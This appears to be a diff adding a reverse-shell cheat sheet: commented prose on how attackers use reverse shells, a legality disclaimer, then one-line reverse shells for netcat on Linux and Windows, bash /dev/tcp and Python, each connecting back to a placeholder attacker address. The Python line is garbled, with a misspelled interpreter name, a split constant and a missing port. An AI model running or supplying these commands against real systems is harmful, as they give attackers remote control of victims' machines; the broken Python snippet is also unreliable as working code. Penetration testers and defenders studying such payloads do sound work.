@@ -1,0 +1,42 @@
+# A reverse shell is a type of shell in which a compromised system connects back to an attacker's system or server, rather than the other way around. It's a common technique used by
+# hackers to gain remote access and control over a target system. Here's how it typically works:
+#
+# 1. **Payload Creation**: The attacker typically creates a malicious payload, often in the form of a script or executable, that contains code to establish a reverse connection.
+#
+# 2. **Payload Execution**: The attacker somehow manages to get the payload executed on the target system. This can be done through various means, such as exploiting vulnerabilities,
+# social engineering, or tricking the victim # # into running the malicious code.
+#
+# 3. **Connection Establishment**: Once the payload is executed on the victim's system, it initiates a connection back to the attacker's system. This connection can be over a network
+# protocol like TCP or UDP.
+#
+# 4. **Shell Access**: After the connection is established, the attacker gains remote access to the victim's system and can execute commands, access files, and control the compromised
+# system as if they had physical access to it.
+#
+# Reverse shells can be used for various purposes, including:
+#
+# - **Maintaining Access**: Attackers use reverse shells to maintain access to a compromised system, allowing them to continue their activities even if the initial point of entry is
+# discovered and closed.
+#
+# - **Data Exfiltration**: Attackers can use reverse shells to steal sensitive data from the compromised system and send it back to their own server.
+#
+# - **Further Exploitation**: Reverse shells can serve as a pivot point for further attacks within a target network, potentially leading to lateral movement and privilege escalation.
+#
+# It's essential to note that the creation and use of reverse shells for unauthorized access to computer systems are illegal and unethical. Reverse shells should only be used for
+# legitimate purposes, such as penetration testing # on systems where you have explicit permission to do so or for system administration tasks when managing remote systems. Unauthorized
+# use of reverse shells is a criminal activity and can result in severe legal consequences.
+
+#Reverse Shells
+
+#Linux
+nc <ip-address> <port> -e /bin/sh
+
+#Windows
+nc <ip-address> <port> -e cmd.exe
+
+#Bash
+bash -i >& /dev/tcp/<ip-address>/<port> 0>&1
+
+#Python
+pyhton -c 'import socket,subprocess,os; s=socket.socket(socket.AF_IN
+ET,socket.SOCK_STREAM); s.connect(("<IP_ADDRES>")); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
